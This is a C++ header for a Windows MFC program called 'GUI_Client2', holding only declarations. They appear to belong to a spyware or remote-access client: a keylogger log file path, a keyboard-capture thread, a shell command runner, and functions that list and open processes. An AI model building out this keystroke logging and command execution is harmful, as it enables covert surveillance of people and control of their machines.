#pragma once
#pragma warning(disable:4996)
#include "stdafx.h"
#include "GUI_Client2.h"


#include "GUI_Client2.h"
#include "afxdialogex.h"
#include <windows.h>
#include <tlhelp32.h>
#include <tchar.h>
#include <wchar.h>
#include <iostream>
#include "stdafx.h"
#include <string>
#include <fstream>

#define KEY_LOG_FILE_PATH "keylogfile.log"

using namespace std;
std::string exec(const char* cmd);
WCHAR* GetProcessList();

bool openProcess(TCHAR* procname);

UINT _cdecl thread_keyboardcatch(LPVOID pParam);

extern ofstream keylogfile;